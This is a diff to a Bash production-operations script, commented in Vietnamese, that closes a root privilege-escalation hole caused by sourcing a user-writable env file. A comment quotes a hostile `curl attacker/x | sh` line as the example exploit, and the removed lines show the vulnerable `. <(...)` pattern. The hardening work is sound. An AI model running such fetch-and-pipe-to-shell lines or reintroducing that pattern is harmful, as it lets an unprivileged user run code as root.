@@ -49,6 +49,30 @@ UNITS_STAGING=(fanfic-worker.service fanfic-translation-worker.service fanfic-wo
 
 ghi_audit() { printf '%s %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" "$*" >> "$AUDIT" 2>/dev/null || true; }
 
+# --- chay mot cong cu Python voi env production ------------------------------
+
+chay_python() {
+  # Truyen DUONG DAN tep env cho Python thay vi `source` no.
+  #
+  # Day la ranh gioi an toan chinh cua tep nay. `. <(...)` THUC THI noi
+  # dung tep; tep do lai den tu `env.stage`, ma ben khong-dac-quyen ghi
+  # duoc. Nen mot dong khong co `=` — hoac mot gia tri `$(...)` — se chay
+  # bang ROOT. Python chi PHAN TICH tep (`doc_env_text`), khong bao gio
+  # chay no.
+  #
+  # Chi cac bien KHONG bi mat duoc dat o day; bi mat khong bao gio di qua
+  # moi truong cua shell nay.
+  local vd
+  vd="$(systemctl show fanfic-worker-prod.service -p Environment 2>/dev/null \
+        | tr ' ' '\n' | sed -n 's/^FAS_VAR_DIR=//p' | tail -1)"
+  cd "$APP" || return 1
+  PYTHONPATH="$APP" \
+  PYTHONUTF8=1 \
+  FAS_PIPER_MODELS_DIR="$MODELS" \
+  FAS_VAR_DIR="${vd:-/var/lib/fanfic-audio-prod}" \
+    "$PY" "$@" --env-file "$ENV_PROD"
+}
+
 # --- rao chan ---------------------------------------------------------------
 
 kiem_env_production() {
@@ -113,18 +137,38 @@ vh_install_env() {
   # khong-dac-quyen khong the tro cong nay vao mot tep bat ky.
   [ -f "$STAGE" ] || { echo "TU CHOI: khong co $STAGE"; return 1; }
 
-  # Kiem TRUOC khi dat vao cho. Mot tep env sai huong khong bao gio duoc
-  # cham toi /etc/fanfic-audio.
-  if ! "$PY" "$APP/scripts/ops/validate_prod_env.py" "$STAGE"; then
+  # KHONG BAO GIO cai tep tho. `--emit` phan tich tep stage roi SINH LAI
+  # noi dung tu allowlist, nen chi dung `REQUIRED_ENV_NAMES` song sot.
+  #
+  # Vi sao khong chi "kiem roi copy": ban dau chinh la nhu vay, va no la
+  # mot lo hong LEO THANG QUYEN that. Bo phan tich Python bo qua moi dong
+  # khong co `=`, con tep tho thi truoc day duoc `bash` doc bang
+  # `. <(...)` — nen mot dong `curl ke-tan-cong/x | sh` di lot qua kiem
+  # duyet roi CHAY BANG ROOT. Nguoi khong-dac-quyen chi can ghi duoc
+  # `env.stage`, va ho ghi duoc that (0620).
+  #
+  # Hai thay doi cung luc dong lo hong do: (1) sinh lai thay vi copy, o
+  # day; (2) khong con duong `bash source` nao — Python doc thang tep.
+  local moi; moi="$(mktemp)"
+  chmod 0600 "$moi"
+  if ! "$PY" "$APP/scripts/ops/validate_prod_env.py" --emit "$STAGE" > "$moi"; then
     ghi_audit "TU CHOI install-env: khang dinh production that bai"
-    rm -f "$STAGE"
+    rm -f "$moi" "$STAGE"
+    return 1
+  fi
+  # Doc lai ban DA SINH va kiem lan nua — thu ta sap cai phai la thu ta da
+  # kiem, khong phai thu ta da doc.
+  if ! "$PY" "$APP/scripts/ops/validate_prod_env.py" "$moi"; then
+    ghi_audit "TU CHOI install-env: ban sinh lai khong qua khang dinh"
+    rm -f "$moi" "$STAGE"
     return 1
   fi
 
   install -d -m 0755 -o root -g root "$ENVD"
   # 0640 root:fanfic — dung nhu GCE. `fanfic` doc duoc, ai khac thi khong.
-  install -m 0640 -o root -g fanfic "$STAGE" "$ENV_PROD"
-  rm -f "$STAGE"
+  install -m 0640 -o root -g fanfic "$moi" "$ENV_PROD"
+  rm -f "$moi"
+  : > "$STAGE"   # rong lai, giu nguyen chu so huu/quyen cho lan sau
   ghi_audit "install-env: da ghi $ENV_PROD"
   echo "  $ENV_PROD ($(stat -c '%a %U:%G' "$ENV_PROD"))"
   kiem_env_production
@@ -150,13 +194,10 @@ vh_preflight() {
     fi
   done
   echo "=== 4. PHU THUOC + R2 + APPWRITE (chi doc/ghi object thu nghiem) ==="
-  ( set -a; . <(tr -d '\r' < "$ENV_PROD"); set +a
-    export PYTHONPATH="$APP" FAS_PIPER_MODELS_DIR="$MODELS" PYTHONUTF8=1
-    export FAS_VAR_DIR="$(systemctl show fanfic-worker-prod.service -p Environment 2>/dev/null \
-        | tr ' ' '\n' | sed -n 's/^FAS_VAR_DIR=//p' | tail -1)"
-    export FAS_VAR_DIR="${FAS_VAR_DIR:-/var/lib/fanfic-audio-prod}"
-    cd "$APP" && "$PY" "$APP/scripts/ops/prod_preflight.py"
-  ) 2>&1 | sed 's/^/  /'
+  # KHONG `source` tep env. Xem ghi chu o `vh_install_env`: `bash source`
+  # THUC THI tep, va tep do den tu mot cho ma ben khong-dac-quyen ghi
+  # duoc. Python nhan duong dan va tu PHAN TICH.
+  chay_python "$APP/scripts/ops/prod_preflight.py" 2>&1 | sed 's/^/  /'
   [ "${PIPESTATUS[0]}" -eq 0 ] || loi=1
   echo "=== KET LUAN PREFLIGHT ==="
   [ "$loi" -eq 0 ] && { echo "  PREFLIGHT_PASS"; return 0; }
@@ -176,6 +217,18 @@ vh_stop_staging() {
 vh_start() {
   kiem_env_production || { ghi_audit "TU CHOI start: env khong phai production"; return 1; }
   kiem_staging_da_tat || return 1
+  # RAO CHAN THU BA — worker NGOAI may nay (vi du GCE) co dang phuc vu
+  # hang doi production khong.
+  #
+  # Rao chan "GCE phai da dung" cua bo dieu phoi song tren may DIEU HANH,
+  # ma verb `start` thi den tu mot hang doi ben khong-dac-quyen ghi duoc —
+  # nen no co the toi ma khong he di qua bo dieu phoi. Rao chan nay song
+  # tren chinh may nay, khong bo qua duoc. Fail closed.
+  echo "  kiem worker ngoai dang giu lease:"
+  if ! chay_python "$APP/scripts/ops/prod_start_guard.py"; then
+    ghi_audit "TU CHOI start: worker ngoai dang phuc vu hang doi production"
+    return 1
+  fi
   for u in "${UNITS_PROD[@]}"; do
     systemctl reset-failed "$u" >/dev/null 2>&1 || true
     systemctl enable --now "$u" >/dev/null 2>&1 || true
@@ -226,13 +279,7 @@ vh_update() {
 
 vh_canary() {
   kiem_env_production || return 1
-  ( set -a; . <(tr -d '\r' < "$ENV_PROD"); set +a
-    export PYTHONPATH="$APP" FAS_PIPER_MODELS_DIR="$MODELS" PYTHONUTF8=1
-    export FAS_VAR_DIR="$(systemctl show fanfic-worker-prod.service -p Environment 2>/dev/null \
-        | tr ' ' '\n' | sed -n 's/^FAS_VAR_DIR=//p' | tail -1)"
-    export FAS_VAR_DIR="${FAS_VAR_DIR:-/var/lib/fanfic-audio-prod}"
-    cd "$APP" && "$PY" "$APP/scripts/ops/prod_canary.py"
-  )
+  chay_python "$APP/scripts/ops/prod_canary.py"
   local rc=$?
   ghi_audit "canary: exit=$rc"
   return "$rc"
